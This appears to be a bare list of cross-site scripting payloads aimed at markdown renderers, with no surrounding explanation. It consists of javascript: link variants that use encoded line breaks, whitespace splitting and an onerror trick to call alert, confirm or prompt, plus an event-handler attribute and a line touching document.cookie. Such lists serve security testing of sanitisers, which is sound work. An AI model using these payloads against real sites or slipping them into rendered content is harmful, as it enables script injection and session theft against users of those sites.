```.py "onmousemove='alert("XSS")'\\
print(document.cookie)
```

[a](javascript:confirm(1))

[a](javascript://www.test.com%0Aprompt(1))

[a](javascript://%0d%0aconfirm(1))

[a](javascript://%0d%0aconfirm(1);com)

[a](javascript:window.onerror=confirm;throw%201)

[a]: (javascript:prompt(1))

[a]:(?javascript:alert(1))    

[XSS](j    a   v   a   s   c   r   i   p   t:alert(1))
